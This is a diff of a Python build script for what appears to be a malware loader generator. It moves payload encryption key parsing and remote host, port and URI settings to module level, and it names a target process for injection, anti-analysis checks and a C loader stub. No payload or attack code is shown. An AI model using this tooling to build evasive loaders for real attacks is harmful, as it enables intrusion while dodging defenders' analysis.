@@ -20,7 +20,21 @@ VERBOSE = True if sys.argv[1] == "true" else False
 PRIORIZE_SIZE = True if sys.argv[2] == "true" else False
 
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
+if ENCRYPTION_METHOD == "xor":
+    if config.get("Payload", "encryption_key") == "random":
+        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
+    else:
+        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
+elif ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
+    ENCRYPTION_KEY = 0x0
+else:
+    print(f"Unknown encryption method: {ENCRYPTION_METHOD}")
+    sys.exit(1)
+
 TARGET_PROCESS = config.get("Payload", "target_process")
+RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
+RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
+RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -41,15 +55,6 @@ STUB_FILE = "loader.c"
 
 
 def main():
-    if config.get("Payload", "encryption_key") == "random":
-        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
-    else:
-        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
-
-
-    RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
-    RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
-    RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
 
     if PRIORIZE_SIZE:
         # no stdlib
